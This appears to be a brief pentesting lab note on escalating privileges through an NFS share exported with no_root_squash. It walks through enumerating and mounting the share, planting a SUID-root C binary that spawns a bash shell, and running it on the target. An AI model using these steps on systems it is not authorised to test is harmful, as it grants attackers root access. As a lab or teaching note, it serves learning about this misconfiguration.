# Overview
NFS lets you share folders over the network. By default, if root writes files to an NFS share, they’re “squashed” → mapped to user to nfsnobody.This prevents remote users from gaining root on the server
If the option no_root_squash is set, root on the client = root on the server.

# Look for shares that has read & write and no root squash

<pre>cat /etc/exports </pre>
<img width="1017" height="130" alt="image" src="https://github.com/user-attachments/assets/a55df973-015e-4dbd-b9e1-fc055f470ab4" />

# Enumerate the shares from kali attack box
showmount -e <target>

# Mount it to your kali machine
mount -o rw 10.10.32.117:/home/ubuntu/sharedfolder /mnt/jrptentest

# Create simple SUID- root inside the mounted share
int main() { setuid(0); system("/bin/bash"); }

# Compile it and give it a SUID bit

gcc nfs.c -o nfs
chmod +s nfs

# The executable should appear on the server now with SUID root

# Run it on the target shell.
